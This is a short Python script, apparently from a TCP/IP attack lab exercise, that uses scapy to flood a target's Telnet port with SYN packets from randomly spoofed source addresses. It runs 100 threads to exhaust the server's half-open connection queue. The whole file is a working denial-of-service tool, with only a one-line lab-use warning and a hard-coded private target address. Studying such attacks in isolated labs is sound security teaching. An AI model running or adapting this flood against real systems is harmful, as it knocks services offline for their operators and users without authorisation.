#!/usr/bin/env python3
"""
SYN Flood Attack — TCP/IP Attack Lab
=====================================
Floods target with spoofed SYN packets to exhaust the server's
half-open connection backlog queue (SYN_RECV state).

Usage:
    sudo python3 synflood.py

Requirements:
    pip install scapy

WARNING: For educational use in isolated lab environments only.
"""

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
import random
import _thread

TARGET_IP   = "10.9.0.5"
TARGET_PORT = 23           # Telnet


def attack():
    """
    Continuously sends SYN packets with random spoofed source IPs.
    Each packet consumes one slot in the server's backlog queue.
    The server will send SYN-ACKs to random non-existent IPs,
    which never reply — leaving the slot occupied until timeout.
    """
    while True:
        # Build IP layer with randomized spoofed source
        ip_layer = IP(dst=TARGET_IP)
        ip_layer.src = str(IPv4Address(random.getrandbits(32)))

        # Build TCP layer — SYN flag only
        tcp_layer = TCP(dport=TARGET_PORT, flags='S')
        tcp_layer.sport = random.getrandbits(16)   # random source port
        tcp_layer.seq   = random.getrandbits(32)   # random sequence number

        pkt = ip_layer / tcp_layer
        send(pkt, verbose=0)


# Spawn 100 threads to compensate for Python's GIL limitation.
# True parallelism is blocked by GIL, but I/O-bound sends still
# benefit from threading. For CPU-bound parallelism, use the C version.
print(f"[*] SYN flooding {TARGET_IP}:{TARGET_PORT} — 100 threads")
print("[*] Press Ctrl+C to stop\n")

for i in range(100):
    _thread.start_new_thread(attack, ())

while True:
    pass
